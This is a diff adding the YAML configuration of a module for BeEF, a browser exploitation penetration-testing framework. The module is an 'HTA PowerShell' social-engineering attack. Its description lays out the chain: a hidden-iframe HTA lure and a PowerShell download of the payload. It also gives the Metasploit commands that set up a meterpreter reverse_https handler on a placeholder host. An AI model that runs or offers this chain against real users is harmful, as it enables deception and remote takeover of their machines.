@@ -1,0 +1,16 @@
+#
+# Copyright (c) 2006-2014 Wade Alcorn - wade@bindshell.net
+# Browser Exploitation Framework (BeEF) - http://beefproject.com
+# See the file 'doc/COPYING' for copying permission
+#
+beef:
+    module:
+        hta_powershell:
+            enable: true
+            category: ["Social Engineering"]
+            name: "HTA PowerShell"
+            description: "Tricks the user into opening and allowing the execution of an HTML Application (HTA), appended to the DOM into an hidden IFrame.<br> If the user allows execution, powershell is used to download the payload from a Metasploit handler and execute it.<br>Before launching the module, do the following on Metasploit:<br>use exploit/windows/misc/psh_web_delivery<br>set URIPATH /psh<br>set PAYLOAD windows/meterpreter/reverse_https<br>set LHOST x.x.x.x<br>set LPORT 443<br>set ExitOnSession false<br>set AutoRunScript post/windows/manage/smart_migrate<br>exploit -j -z"
+            authors: ["antisnatchor"]
+            target:
+                user_notify: ["IE"]
+                not_working: ["ALL"]
